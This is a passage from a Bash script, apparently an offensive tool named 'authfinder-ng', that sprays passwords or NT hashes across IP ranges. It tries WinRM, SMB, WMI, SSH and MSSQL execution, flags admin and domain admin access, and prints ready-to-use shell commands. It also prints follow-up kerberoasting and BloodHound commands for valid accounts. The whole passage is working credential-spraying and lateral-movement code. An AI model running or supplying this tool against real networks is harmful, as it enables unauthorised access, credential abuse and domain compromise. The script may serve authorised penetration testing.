                # [+] only (auth confirmed, check if Pwn3d!)
                print_auth "  wmi: AUTH OK as ${user} on ${ip} — not local admin"
                record_auth_only "$ip" "$tool" "$user" "$cred"
                return 1
            fi
            [[ $rc -eq 0 && -z "$out" ]] && { print_fail "  wmi failed silently"; return 1; }
            return 0 ;;

        ssh)
            echo "$out" | grep -q "\[-\]" && {
                print_fail "  ssh failed"
                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                return 1; }
            if echo "$out" | grep -q "Linux - Shell" && [[ "$LINUX_MODE" == "false" ]]; then
                print_warn "  SSH auth OK on Linux target — use --linux"
                record_auth_only "$ip" "$tool" "$user" "$cred"
                return 1
            fi
            return 0 ;;

        mssql)
            echo "$out" | grep -qi "EXECUTE permission.*denied" && {
                print_warn "  MSSQL: auth OK but xp_cmdshell denied — need sysadmin role"
                record_auth_only "$ip" "$tool" "$user" "$cred"
                return 1; }
            echo "$out" | grep -qi "ERROR\|Login failed" && {
                print_fail "  mssql failed"
                analyze_error "$tool" "$out" "$ip" "$user" "$cred" "$use_hash"
                return 1; }
            return 0 ;;
    esac

    print_fail "  ${tool} failed (rc=${rc})"
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════
# RECORDING
# ═══════════════════════════════════════════════════════════════════════════
record_success() {
    local ip="$1" tool="$2" user="$3" cred="$4" shell_cmd="$5" is_admin="$6"
    ( flock -x 200
      echo "${ip}|${tool}|${user}|${cred}|${shell_cmd}|${is_admin}" >> "$RESULTS_FILE"
    ) 200>"$LOCK_FILE"
}

record_auth_only() {
    local ip="$1" tool="$2" user="$3" cred="$4"
    ( flock -x 200
      grep -q "^${ip}|.*|${user}|" "$AUTH_FILE" 2>/dev/null && return
      echo "${ip}|${tool}|${user}|${cred}" >> "$AUTH_FILE"
    ) 200>"$LOCK_FILE"
}

record_failure() {
    local user="$1"
    [[ ! -f "$LOCK_FILE" ]] && return
    ( flock -x 200
      echo "$user" >> "$FAIL_FILE"
      local cnt; cnt=$(grep -c "^${user}$" "$FAIL_FILE" 2>/dev/null || echo 0)
      (( cnt >= LOCKOUT_THRESHOLD )) && \
          echo -e "${BRED}[LOCKOUT RISK] '${user}' failed ${cnt}x — consider stopping!${NC}"
    ) 200>"$LOCK_FILE"
}

# ═══════════════════════════════════════════════════════════════════════════
# CHAIN
# ═══════════════════════════════════════════════════════════════════════════
run_chain() {
    local user="$1" ip="$2" cred="$3" use_hash="$4" command="$5" domain="${6:-}"
    shift 6
    local -a tool_list=("$@")
    [[ ${#tool_list[@]} -eq 0 ]] && tool_list=("${VALID_TOOLS[@]}")

    if [[ "$TOOLS_SPECIFIED" == "true" ]]; then
        local -a expanded=()
        for t in "${tool_list[@]}"; do
            [[ "$t" == "winrm" ]] && expanded+=(winrm winrm-ssl) || expanded+=("$t")
        done
        tool_list=("${expanded[@]}")
    fi

    local any_exec=false

    for tool in "${tool_list[@]}"; do
        run_tool "$tool" "$user" "$ip" "$cred" "$use_hash" "$command" "$domain"
        local rc=$?

        if [[ $rc -eq 0 ]]; then
            any_exec=true
            local is_admin; is_admin=$(get_ctx "$ip" "$user" "IS_ADMIN")
            local is_da;    is_da=$(get_ctx "$ip" "$user" "IS_DA")
            local shell_cmd; shell_cmd=$(build_shell_cmd "$tool" "$user" "$ip" "$cred" "$use_hash" "$domain")
            record_success "$ip" "$tool" "$user" "$cred" "$shell_cmd" "$is_admin"

            lprint ""
            local admin_tag=""; [[ "$is_admin" == "true" ]] && admin_tag=" ${BRED}[ADMIN]${BGRN}${BOLD}"
            local da_tag="";    [[ "$is_da" == "true" ]]    && da_tag=" ${BRED}[DOMAIN ADMIN]${BGRN}${BOLD}"
            lprint "${BGRN}${BOLD}  ╔═══════════════════════════════════════════════════════════════╗${NC}"
            lprint "${BGRN}${BOLD}  ║  ACCESS: ${ip} via ${tool} as ${user}${admin_tag}${da_tag}${NC}"
            lprint "${BGRN}${BOLD}  ╚═══════════════════════════════════════════════════════════════╝${NC}"

            [[ "$SHOW_NEXT_STEPS" == "true" ]] && \
                next_steps "$tool" "$ip" "$user" "$cred" "$use_hash" "$domain"

            [[ "$RUN_ALL" == "false" ]] && return 0
        fi

        [[ "$SPRAY_DELAY" -gt 0 ]] && sleep "$SPRAY_DELAY"
    done

    $any_exec || record_failure "$user"
}

# ═══════════════════════════════════════════════════════════════════════════
# IP EXECUTOR
# ═══════════════════════════════════════════════════════════════════════════
execute_on_ip() {
    local user="$1" ip="$2" cred="$3" use_hash="$4" command="$5" domain="${6:-}"
    shift 6
    local -a tool_list=("$@")

    print_sep
    lprint "${INFO} ${BOLD}Target:${NC} ${CYAN}${ip}${NC}  ${BOLD}User:${NC} ${YELLOW}${user}${NC}  ${BOLD}Auth:${NC} $( [[ "$use_hash" == "1" ]] && echo "PTH" || echo "Password" )"

    local -a viable=()

    if [[ "$SKIP_PORTSCAN" == "true" ]]; then
        viable=("${tool_list[@]}")
        [[ ${#viable[@]} -eq 0 ]] && viable=("${VALID_TOOLS[@]}")
        lprint "    ${DIM}(portscan skipped)${NC}"
        check_port "$ip" 3389 && echo "3389" >> "${TMP_DIR}/ports_${ip//./_}.txt" 2>/dev/null || true
    else
        print_info "  Port scanning ${ip}..."
        mapfile -t viable < <(scan_ports_for_ip "$ip" "${tool_list[@]}")

        if [[ ${#viable[@]} -eq 0 ]]; then
            print_fail "  No required ports open on ${ip}"
            print_tip "Use --skip-portscan to attempt anyway"
            return
        fi

        local -a disp=()
        for t in "${viable[@]}"; do
            local dt="$t"; [[ "$t" == "winrm-ssl" ]] && dt="winrm(SSL)"
            [[ ! " ${disp[*]} " =~ " $dt " ]] && disp+=("$dt")
        done
        local rdp_note=""
        ip_has_port "$ip" 3389 && [[ ! " ${viable[*]} " =~ " rdp " ]] && \
            rdp_note="${DIM} +RDP(visible,not-in-chain)${NC}"
        lprint "    ${BLUE}[i]${NC} Viable: ${CYAN}${disp[*]}${NC}${rdp_note}"
    fi

    run_chain "$user" "$ip" "$cred" "$use_hash" "$command" "$domain" "${viable[@]}"
}

# ═══════════════════════════════════════════════════════════════════════════
# SUMMARY
# ═══════════════════════════════════════════════════════════════════════════
print_summary() {
    lprint ""
    lprint "${BOLD}${BLUE}══════════════════════════════════════════════════════════════════${NC}"
    lprint "${BOLD}${BLUE}  SCAN COMPLETE — SUMMARY${NC}"
    lprint "${BOLD}${BLUE}══════════════════════════════════════════════════════════════════${NC}"

    local -a exec_entries=() auth_entries=()
    [[ -f "$RESULTS_FILE" ]] && mapfile -t exec_entries < "$RESULTS_FILE"
    [[ -f "$AUTH_FILE"    ]] && mapfile -t auth_entries  < "$AUTH_FILE"

    # Exec successes
    if [[ ${#exec_entries[@]} -gt 0 ]]; then
        lprint ""
        lprint "${BGRN}${BOLD}  ╔══ COMMAND EXECUTION ACCESS — ${#exec_entries[@]} target(s) ══╗${NC}"
        lprint ""
        lprint "  $(printf '%-17s %-11s %-20s %-6s %s' 'IP' 'TOOL' 'USER' 'ADMIN' 'SHELL')"
        lprint "  $(printf '%.0s─' {1..78})"
        for entry in "${exec_entries[@]}"; do
            IFS='|' read -r ip tool user cred shell_cmd is_admin <<< "$entry"
            local adm="${DIM}no${NC}"; [[ "$is_admin" == "true" ]] && adm="${BRED}YES${NC}"
            lprint "  $(printf "${GREEN}%-17s${NC} ${YELLOW}%-11s${NC} ${CYAN}%-20s${NC} " "$ip" "$tool" "$user")${adm} ${ORANGE}${shell_cmd}${NC}"
        done
        lprint ""
        lprint "  ${BOLD}Ready-to-use shell commands:${NC}"
        for entry in "${exec_entries[@]}"; do
            IFS='|' read -r ip tool user cred shell_cmd is_admin <<< "$entry"
            lprint "  ${DIM}# ${ip} — ${tool} as ${user}$( [[ "$is_admin" == "true" ]] && echo " [ADMIN]" )${NC}"
            lprint "  ${ORANGE}${shell_cmd}${NC}"
            lprint ""
        done
    fi

    # Auth-only hits
    if [[ ${#auth_entries[@]} -gt 0 ]]; then
        lprint ""
        lprint "${YELLOW}${BOLD}  ╔══ VALID CREDENTIALS (no exec access): ${#auth_entries[@]} hit(s) ══╗${NC}"
        lprint "  ${DIM}Credentials valid — user is not local admin. Use for enumeration.${NC}"
        lprint ""
        lprint "  $(printf '%-17s %-11s %-20s' 'IP' 'PROTO' 'USER')"
        lprint "  $(printf '%.0s─' {1..50})"
        for entry in "${auth_entries[@]}"; do
            IFS='|' read -r ip tool user cred <<< "$entry"
            lprint "  $(printf "${YELLOW}%-17s${NC} %-11s ${CYAN}%-20s${NC}" "$ip" "$tool" "$user")"
        done
        lprint ""
        lprint "  ${BOLD}Enumeration commands for valid accounts:${NC}"
        local -A seen_auth=()
        for entry in "${auth_entries[@]}"; do
            IFS='|' read -r ip tool user cred <<< "$entry"
            local akey="${ip}:${user}"
            [[ -n "${seen_auth[$akey]:-}" ]] && continue
            seen_auth["$akey"]=1
            local nxc_a="-u '${user}' -p '${cred}'"
            is_nthash "$cred" && nxc_a="-u '${user}' -H '${cred#:}'"
            lprint "  ${DIM}# ${user} @ ${ip}${NC}"
            lprint "  ${ORANGE}${NXC_CMD} smb  ${ip} ${nxc_a} --pass-pol 2>/dev/null${NC}"
            lprint "  ${ORANGE}${NXC_CMD} ldap ${ip} ${nxc_a} --kerberoasting kerberoast_${user}.txt${NC}"
            lprint "  ${ORANGE}${NXC_CMD} ldap ${ip} ${nxc_a} --bloodhound -c All${NC}"
            lprint ""
        done
    fi

    # All failed
    if [[ ${#exec_entries[@]} -eq 0 && ${#auth_entries[@]} -eq 0 ]]; then
        lprint "${FAIL} No access found"
        lprint ""
        lprint "  Troubleshooting:"
        lprint "  • Verify creds: ${NXC_CMD} smb TARGET -u USER -p PASS"
        [[ -z "$DOMAIN" ]] && lprint "  • Domain creds? Add: -d DOMAIN"
        lprint "  • Local account? Add: --local-auth"
        lprint "  • Firewalled? Try: --skip-portscan"
        lprint "  • Check lockout policy BEFORE retrying more creds"
        lprint "  • Slow network? --timeout 40 --winrm-timeout 60"
    fi

    [[ -n "$REPORT_FILE" ]] && { generate_report; lprint "${OK} Report saved: ${BOLD}${REPORT_FILE}${NC}"; }
    lprint "${BOLD}${BLUE}══════════════════════════════════════════════════════════════════${NC}"
}

generate_report() {
    {
        echo "# authfinder-ng v${VERSION} Report"
        echo "**Date:** $(date)"
        echo ""
        if [[ -f "$RESULTS_FILE" && -s "$RESULTS_FILE" ]]; then
            echo "## Execution Access"
            echo "| IP | Tool | User | Admin | Shell Command |"
            echo "|----|------|------|-------|---------------|"
            while IFS='|' read -r ip tool user cred shell_cmd is_admin; do
                echo "| \`${ip}\` | ${tool} | ${user} | ${is_admin} | \`${shell_cmd}\` |"
            done < "$RESULTS_FILE"
            echo ""
        fi
        if [[ -f "$AUTH_FILE" && -s "$AUTH_FILE" ]]; then
            echo "## Valid Credentials (no exec)"
            echo "| IP | Protocol | User |"
            echo "|----|----------|------|"
            while IFS='|' read -r ip tool user cred; do
                echo "| \`${ip}\` | ${tool} | ${user} |"
            done < "$AUTH_FILE"
        fi
    } > "$REPORT_FILE"
}

cleanup() { [[ -n "$TMP_DIR" && -d "$TMP_DIR" ]] && rm -rf "$TMP_DIR"; }

# ═══════════════════════════════════════════════════════════════════════════
# USAGE
# ═══════════════════════════════════════════════════════════════════════════
usage() {
    cat << EOF
${BOLD}${CYAN}authfinder-ng${NC} v${VERSION} — Multi-Protocol Access Discovery Engine

${BOLD}USAGE:${NC}
  authfinder-ng <target>  -u USER  -p PASS  [-c CMD] [options]
  authfinder-ng <target>  -u USER  -H HASH  [-c CMD] [options]
  authfinder-ng <target>  -f CREDS_FILE     [-c CMD] [options]
  authfinder-ng --install-tools | --check-tools

${BOLD}TARGETS:${NC}
  10.10.10.1              Single IP          10.10.10.1-50       Range
  10.10.10,11.1-254       Multi-octet        192.168.0.0/24      CIDR
  targets.txt             File of IPs/ranges (# comments OK)

${BOLD}AUTHENTICATION:${NC}
  -u USER  -p PASS        Password auth      -u USER  -H HASH    Pass-the-hash
  -d DOMAIN               Domain name        -f FILE             Cred file (auto-detects hashes)
  --local-auth            Force local auth

${BOLD}EXECUTION:${NC}
  -c CMD                  Command (default: whoami /all)
  --tools LIST            winrm,smbexec,wmi,ssh,mssql,psexec,atexec,rdp
  --run-all               Try all tools even after success
  --linux                 Linux mode (SSH + bash encoding)

${BOLD}OPTIONS:${NC}
  --skip-portscan         Try all tools regardless of port state
  --threads N             Parallel threads (default: 10)
  --timeout N             Command timeout seconds (default: 20)
  --winrm-timeout N       WinRM timeout (default: 30)
  --rdp-timeout N         RDP timeout (default: 45)
  --delay N               Spray delay per attempt (default: 0)
  --lockout-threshold N   Warn after N per-user failures (default: 3)
  --no-next-steps         Hide post-exploitation guidance
  --report FILE           Save markdown report
  -v                      Verbose/debug output

${BOLD}EXAMPLES:${NC}
  authfinder-ng 10.10.10.1 -u administrator -p 'P@ss!'
  authfinder-ng 192.168.1.0/24 -u admin -H aad3b435b51404eeaad3b435b51404ee
  authfinder-ng 10.0.0.1-10 -u jsmith -p pass -d CORP --tools winrm,wmi
  authfinder-ng 10.0.0.1-50 -f creds.txt --delay 5 --lockout-threshold 2
  authfinder-ng 172.16.0.1-20 -u root -p toor --linux
  authfinder-ng 10.0.0.0/24 -u admin -p pass --run-all --report out.md
  authfinder-ng 10.10.10.1 -u sa -p pass --tools mssql

${BOLD}CRED FILE FORMAT:${NC}
  user1                            # username
  Password123                      # password
  user2
  aabbccdd11223344aabbccdd11223344 # NT hash (auto-detected)
  # blank lines and # comments ignored

EOF
    exit 0
}

# ═══════════════════════════════════════════════════════════════════════════
# ARGUMENT PARSING
# ═══════════════════════════════════════════════════════════════════════════
parse_args() {
    [[ $# -eq 0 ]] && usage
    IP_RANGE=""; USER=""; PASS=""; HASH=""; COMMAND=""; CRED_FILE=""; TOOL_LIST_STR=""

    local i=0; local -a args=("$@")
    while [[ $i -lt ${#args[@]} ]]; do
        local a="${args[$i]}"
        case "$a" in
            -h|--help)            usage ;;
            --install-tools)      install_tools ;;
            --check-tools)        ONLY_CHECK_TOOLS=true ;;
            -v|--verbose)         VERBOSE=true ;;
            --run-all)            RUN_ALL=true ;;
            --skip-portscan)      SKIP_PORTSCAN=true ;;
            --linux)              LINUX_MODE=true ;;
            --local-auth)         LOCAL_AUTH=true ;;
            --no-next-steps)      SHOW_NEXT_STEPS=false ;;
            -u|--user)            ((i++)); USER="${args[$i]}" ;;
            -p|--pass|--password) ((i++)); PASS="${args[$i]}" ;;
            -H|--hash)            ((i++)); HASH="${args[$i]}" ;;
            -d|--domain)          ((i++)); DOMAIN="${args[$i]}" ;;
            -c|--command)         ((i++)); COMMAND="${args[$i]}" ;;
            -f|--file)            ((i++)); CRED_FILE="${args[$i]}" ;;
            --tools)              ((i++)); TOOL_LIST_STR="${args[$i]}" ;;
            --threads)            ((i++)); MAX_THREADS="${args[$i]}" ;;
            --timeout)            ((i++)); EXEC_TIMEOUT="${args[$i]}" ;;
            --winrm-timeout)      ((i++)); WINRM_TIMEOUT="${args[$i]}" ;;
            --rdp-timeout)        ((i++)); RDP_TIMEOUT="${args[$i]}" ;;
            --delay)              ((i++)); SPRAY_DELAY="${args[$i]}" ;;
            --lockout-threshold)  ((i++)); LOCKOUT_THRESHOLD="${args[$i]}" ;;
            --report)             ((i++)); REPORT_FILE="${args[$i]}" ;;
            -*)
                echo -e "${RED}[!] Unknown option: ${a}  (--help for usage)${NC}" >&2; exit 1 ;;
            *)
                [[ -z "$IP_RANGE" ]] && IP_RANGE="$a" \
                    || { echo -e "${RED}[!] Unexpected argument: ${a}${NC}" >&2; exit 1; } ;;
        esac
        ((i++)) || true
    done

    [[ -z "$IP_RANGE" && "$ONLY_CHECK_TOOLS" == "false" ]] && \
        { echo -e "${RED}[!] Target IP range required${NC}" >&2; usage; }

    if [[ "$ONLY_CHECK_TOOLS" == "false" ]]; then
        [[ -n "$CRED_FILE" && ( -n "$USER" || -n "$PASS" || -n "$HASH" ) ]] && \
            { echo -e "${RED}[!] Cannot combine -f with -u/-p/-H${NC}" >&2; exit 1; }
        if [[ -z "$CRED_FILE" ]]; then
            [[ -z "$USER" ]] && { echo -e "${RED}[!] Need -u USER or -f FILE${NC}" >&2; exit 1; }
            [[ -z "$PASS" && -z "$HASH" ]] && { echo -e "${RED}[!] Need -p PASS or -H HASH${NC}" >&2; exit 1; }
            [[ -n "$PASS" && -n "$HASH" ]] && { echo -e "${RED}[!] Cannot use -p and -H together${NC}" >&2; exit 1; }
        fi
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════
main() {
    parse_args "$@"

    TMP_DIR=$(mktemp -d)
    RESULTS_FILE="${TMP_DIR}/results.txt"
    AUTH_FILE="${TMP_DIR}/auth_only.txt"
    FAIL_FILE="${TMP_DIR}/failures.txt"
    LOCK_FILE="${TMP_DIR}/output.lock"
    touch "$RESULTS_FILE" "$AUTH_FILE" "$FAIL_FILE" "$LOCK_FILE"
    trap cleanup EXIT

    banner
    verify_tools
    [[ "$ONLY_CHECK_TOOLS" == "true" ]] && exit 0

    # Tool list
    local -a tool_list=()
    if [[ "$LINUX_MODE" == "true" ]]; then
        [[ -n "$TOOL_LIST_STR" ]] && print_warn "--tools ignored in --linux mode"
        tool_list=(ssh); TOOLS_SPECIFIED=true
    elif [[ -n "$TOOL_LIST_STR" ]]; then
        TOOLS_SPECIFIED=true
        IFS=',' read -ra raw_tools <<< "$TOOL_LIST_STR"
        for t in "${raw_tools[@]}"; do
            t="${t,,}"
            [[ "$t" =~ ^(evil-?winrm|evilwinrm)$ ]] && t="winrm"
            if [[ ! " ${VALID_TOOLS[*]} " =~ " $t " ]]; then
                echo -e "${RED}[!] Invalid tool: $t  Valid: ${VALID_TOOLS[*]}${NC}"; exit 1; fi
            [[ ! " ${tool_list[*]} " =~ " $t " ]] && tool_list+=("$t")
        done
    fi

    # Parse IPs
    local -a ips=()
    mapfile -t ips < <(parse_ip_range "$IP_RANGE")
    [[ ${#ips[@]} -eq 0 ]] && { echo -e "${RED}[!] No IPs from: ${IP_RANGE}${NC}"; exit 1; }

    # Parse credentials
    local -a cred_lines=()
    if [[ -n "$CRED_FILE" ]]; then
        mapfile -t cred_lines < <(load_creds_file "$CRED_FILE")
    else
        local use_hash=0 cred="$PASS"
        [[ -n "$HASH" ]] && { cred="$HASH"; use_hash=1; }
        cred_lines=("${USER}|${cred}|${use_hash}")
    fi

    local command="${COMMAND:-whoami /all}"
    local total_tasks=$(( ${#ips[@]} * ${#cred_lines[@]} ))
    local threads=$(( MAX_THREADS < total_tasks ? MAX_THREADS : total_tasks ))
    (( threads < 1 )) && threads=1

    echo -e "${BOLD}${BLUE}── Scan Parameters ────────────────────────────────────────────────${NC}"
    echo -e "${INFO} Targets  : ${BOLD}${#ips[@]}${NC} IPs | Threads: ${BOLD}${threads}${NC}"
    echo -e "${INFO} Creds    : ${BOLD}${#cred_lines[@]}${NC} set(s)"
    echo -e "${INFO} Command  : ${YELLOW}${command}${NC}"
    [[ -n "$DOMAIN" ]]             && echo -e "${INFO} Domain   : ${YELLOW}${DOMAIN}${NC}"
    [[ "$LOCAL_AUTH" == "true" ]]  && echo -e "${INFO} Mode     : ${YELLOW}Local Auth${NC}"
    [[ ${#tool_list[@]} -gt 0 ]]   && echo -e "${INFO} Tools    : ${YELLOW}${tool_list[*]}${NC}"
    [[ "$SKIP_PORTSCAN" == "true" ]] && echo -e "${WARN} ${YELLOW}Portscan disabled — all tools will be attempted${NC}"
    [[ "$SPRAY_DELAY" -gt 0 ]]     && echo -e "${INFO} Delay    : ${YELLOW}${SPRAY_DELAY}s per attempt${NC}"
    echo ""

    # Execute
    for ip in "${ips[@]}"; do
        for cred_line in "${cred_lines[@]}"; do
            while [[ $(jobs -r 2>/dev/null | wc -l) -ge $threads ]]; do sleep 0.1; done
            IFS='|' read -r user cred use_hash <<< "$cred_line"
            ( execute_on_ip "$user" "$ip" "$cred" "$use_hash" "$command" "$DOMAIN" "${tool_list[@]}" ) &
        done
    done

    wait
    print_summary
}

main "$@"
